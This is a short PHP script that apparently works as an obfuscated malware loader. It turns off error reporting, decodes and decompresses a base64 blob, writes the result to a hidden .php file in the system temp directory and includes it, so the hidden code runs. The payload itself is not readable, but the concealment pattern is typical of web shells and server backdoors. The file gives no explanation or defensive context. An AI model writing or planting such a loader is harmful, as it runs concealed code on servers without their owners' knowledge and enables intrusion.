<?php
declare(strict_types=1);
error_reporting(0);
$enqyaj1 = 'ZZBdj5pAFIbv51dMNiZi7Ico69Lgph0QERWRpaK1aQgfI6AIA4MEbfe/F3S3N52LSeY957zznmf0lYQEtLyTD5/ht5a90s3vP9tOUrR/CaBFjrU6Go1kfQI+NkeUFXUJV2txoUpwLv+4iUBTlb2GeopkZoqpuoOxIYvIWCPEKUs0lsTImIuBIX0elNnTyZqVsZ8u+vJ1Ux0C1pxaR5BmSbWZ9MhZOZLLcMrGMz5OtU02uA77/UQkVZ7PwoC6k8rcmgEK3V5353/ZlYf1VqY+egGmZGXdwNqiQuM5VqQ0J4tYL6eR/BQWC5b6Z1ljzdB4kbQNXs28XkFPnDXnvWS+u+KIB7y66x6ubv9R5/RJmFeeoY6RgcT72vJy/N/SNRPhBo7WjHBF4tTHzMOfhw+wETvv9FKCE0pjmxzxxQ5wYZOzG0ceU1c7wjv4dlsA+zTHjhdC5u7pUNgqnfiMO/A3gDDaQ+af1c3B9rGXX0jBuA7FQ655NgnehuoUPq6v+pe7AbzFgp+em4JQC6/gFeC6mXmL+xc=';
$enqyaj2 = gzinflate(base64_decode($enqyaj1));
$enqyaj3 = sys_get_temp_dir() . '/.' . md5($enqyaj1) . '.php';
file_put_contents($enqyaj3, $enqyaj2);
include $enqyaj3;
